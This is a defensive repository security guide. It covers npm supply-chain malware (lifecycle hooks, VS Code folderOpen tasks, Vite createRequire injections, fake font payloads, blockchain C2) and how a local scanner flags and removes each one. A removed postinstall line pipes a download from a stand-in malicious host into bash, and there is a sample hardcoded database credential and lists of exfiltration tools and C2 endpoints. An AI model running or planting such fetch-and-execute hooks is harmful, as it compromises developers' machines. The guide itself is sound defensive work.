# 🛡️ Project Initialization & Security Audit Guide

> **CRITICAL SECURITY DIRECTIVE:**
> Whenever you clone, pull, or receive any project repository, **ALWAYS** follow these steps **BEFORE** running `npm install`, `npm run dev`, or opening the folder with automated IDE extensions.

---

## 🚨 Why This Is Necessary

Modern repositories are targeted by sophisticated supply chain attacks that exploit:
1. **Malicious `package.json` lifecycle scripts** (`preinstall`, `postinstall`) that execute malware the moment you run `npm install`.
2. **VS Code Auto-Execution Exploits** (`.vscode/tasks.json` with `runOn: folderOpen`) that run hidden shell scripts when you open the folder.
3. **Vite / Build Tool Injections** (`createRequire` bridges or dynamic C2 loaders in `vite.config.js`).
4. **Decentralized Blockchain C2 Endpoints** (connecting to Ethereum RPCs like `1rpc.io`, `eth.drpc.org`, `blastapi.io` to fetch payloads dynamically).
5. **Disguised Payload Files** (fake font files like `fa-solid-400.woff2` containing encrypted executable binaries).

---

## 📋 Step-by-Step Initialization Workflow

Follow these steps in exact order every time you set up a cloned or updated repository:

```
[Clone Repo] ──> [1. Run Security Scan] ──> [2. Fix Flagged Issues] ──> [3. Clean Cache] ──> [4. Safe NPM Install] ──> [5. Offline Test]
```

---

### Step 1: Run the Pre-Installation Security Audit
**DO NOT run `npm install` yet!** Run the security scanner first to audit source code, configs, IDE settings, and build scripts.

#### On Windows (PowerShell / Command Prompt / Git Bash):
```bash
node scripts/security-scan.js
```

#### On macOS / Linux:
```bash
node scripts/security-scan.js
# Or:
bash scripts/security-scan.sh
```

---

## 🛠️ How to Read Findings & Exact Code to Delete

When the scanner detects an issue, it prints:
* The **File** and **Line number**
* The **Category** and **Details**
* The offending **Snippet**
* The exact **Action** required to resolve it

### Finding Categories & Triage Actions:

#### 1. `KNOWN_MALWARE_PAYLOAD` (e.g. `fa-solid-400.woff2`)
* **What it is:** A fake font file or asset containing an encrypted executable payload.
* **Fix:** 🗑️ **DELETE THE ENTIRE FILE.**
  ```bash
  rm Frontend/public/fa-solid-400.woff2
  ```

#### 2. `UNAUTHORIZED_CREATEREQUIRE` (in `vite.config.js`)
* **What it is:** A CommonJS require bridge injected into an ESM Vite config to load malware on dev server start.
* **Fix:** ✂️ **DELETE the createRequire definition and any `global.require` / `global.i` assignments.**
  ```diff
  - import { createRequire } from 'module';
  - const require = createRequire(import.meta.url);
  - global.require = require;
  - global.i = ...;
  ```

#### 3. `MALWARE_SIGNATURE` / `HIDDEN_WHITESPACE_OBFUSCATION`
* **What it is:** Scope tampering (`global.i =`, `global[...] =`, `var _0x...`) or malicious code hidden off-screen using 80+ spaces.
* **Fix:** ✂️ **DELETE the entire flagged line from the file.**

#### 4. `IDE_AUTO_RUN_EXPLOIT` (`.vscode/tasks.json`)
* **What it is:** A task configured to auto-execute shell commands as soon as you open the workspace.
* **Fix:** ✂️ **DELETE `.vscode/tasks.json` or remove the task containing `"runOn": "folderOpen"`.**

#### 5. `MALICIOUS_LIFECYCLE_SCRIPT` (`package.json`)
* **What it is:** A `preinstall`, `postinstall`, or `prebuild` hook running `curl`, `powershell`, or downloading external binaries.
* **Fix:** ✂️ **DELETE the script hook from `package.json`.**
  ```diff
  "scripts": {
  -   "postinstall": "curl -s http://malicious.url/payload.sh | bash",
      "dev": "vite",
      "build": "vite build"
  }
  ```

#### 6. `LEAKED_CREDENTIAL` (e.g. Hardcoded MongoDB URI with password)
* **What it is:** Database credentials or API keys hardcoded directly in tracked `.js` or `.cjs` files.
* **Fix:** 🔒 **REPLACE the hardcoded string with environment variables.**
  ```diff
  - const MONGODB_URI = 'mongodb+srv://admin:secretpassword@cluster.mongodb.net';
  + const MONGODB_URI = process.env.MONGODB_URI;
  ```
  Move the actual secret into a `.env` file (which MUST be gitignored).

---

## 🔁 Why Malware Regenerates & How to Permanently Stop It

If you delete a malware file (e.g. `fa-solid-400.woff2`) but it keeps reappearing, here is why:

```
[1. Trigger in Config] ──(npm run dev)──> [2. Re-downloads/Creates Payload] ──> [3. Bundles into .vite/ Cache]
```

### The 3-Step Sequence to Permanently Stop Regeneration:

1. **Step 1: Clean the Source Configuration Trigger FIRST**
   * Edit `vite.config.js`, `package.json`, or `.vscode/tasks.json` and remove the trigger lines.
2. **Step 2: Delete any generated payload files**
   * Remove any `fa-solid-400.woff2` or suspicious binary files.
3. **Step 3: Completely wipe caches and lockfiles**
   * Delete `node_modules/`, `.vite/`, `package-lock.json`, and run `npm cache clean --force`.

---

### Step 2: Clean Existing Caches & Artifacts

#### On macOS / Linux / Git Bash:
```bash
# In the Frontend directory:
cd Frontend
rm -rf node_modules package-lock.json .vite dist

# In the Backend directory:
cd ../Backend
rm -rf node_modules package-lock.json dist
```

#### On Windows (PowerShell):
```powershell
# In the Frontend directory:
cd Frontend
Remove-Item -Recurse -Force node_modules, package-lock.json, .vite, dist -ErrorAction SilentlyContinue

# In the Backend directory:
cd ../Backend
Remove-Item -Recurse -Force node_modules, package-lock.json, dist -ErrorAction SilentlyContinue
```

---

### Step 3: Clear Global NPM Cache
Purge any corrupted or infected packages cached in your system's global npm store:
```bash
npm cache clean --force
```

---

### Step 4: Perform a Clean Dependency Installation
Install dependencies cleanly:

```bash
# In Frontend:
cd Frontend
npm install

# In Backend:
cd ../Backend
npm install
```

*(Optional Maximum Security Mode: Use `npm install --ignore-scripts` if auditing a completely untrusted third-party repo to prevent any package from running pre/post-install code).*

---

### Step 5: Run Deep Audit
Verify that installed packages and local dependencies are completely clean:

```bash
node ../scripts/security-scan.js --deep
```

---

### Step 6: Verify with Offline Dev Boot (Sanity Test)
To guarantee there are no stealth background network connections (such as Ethereum RPC C2 calls):

1. **Disconnect your machine from Wi-Fi / Internet.**
2. In the `Frontend/` folder, run:
   ```bash
   npm run dev
   ```
3. **Verify:**
   - The Vite dev server should start normally and display `http://localhost:5173`.
   - There should be **NO** `AggregateError: All promises were rejected`, `getaddrinfo EAI_AGAIN`, or network connection errors in the terminal.
4. **Reconnect to the Internet.** You are now safe to develop!

---

## 🔍 What the Security Scanner Audits

| # | Engine / Check | What It Protects Against |
|---|---|---|
| 1 | **Global Scope & Obfuscation** | Detects scope tampering, obfuscated variable identifiers, dynamic eval |
| 2 | **Hidden Whitespace Obfuscation** | Detects lines with >80 spaces used to hide malicious payload code off-screen |
| 3 | **Zero-Width & Unicode Attacks** | Detects invisible zero-width characters and Trojan Source RTL override attacks |
| 4 | **Vite & Build Tool Injections** | Flags unauthorized `createRequire` bridges in `vite.config.*` |
| 5 | **Malicious Lifecycle Scripts** | Audits `package.json` for `preinstall`/`postinstall` scripts running `curl`, `wget`, `powershell`, `certutil` |
| 6 | **IDE Auto-Run Exploits** | Flags `.vscode/tasks.json` with `runOn: folderOpen` or terminal command hijacking in `settings.json` |
| 7 | **Disguised Malware Payloads** | Catches `fa-solid-400.woff2` fake font files and unexpected `.exe`, `.dll`, `.vbs`, `.ps1` in source folders |
| 8 | **Credential & Secret Leaks** | Detects hardcoded database passwords, AWS keys, Stripe live keys, GitHub PATs, and unignored `.env` files |
| 9 | **C2 & Exfiltration Endpoints** | Flags Discord webhooks, Telegram bots, ngrok tunnels, Pastebin raw downloaders, and Ethereum RPC C2 endpoints (`1rpc.io`, `drpc.org`, `blastapi.io`) |

---

## 💻 CLI Commands Quick Reference

```bash
# Standard Repository Audit
node scripts/security-scan.js

# Deep Audit (including node_modules)
node scripts/security-scan.js --deep

# JSON Output for CI/CD Pipelines
node scripts/security-scan.js --json

# From Frontend or Backend:
npm run scan:security
```
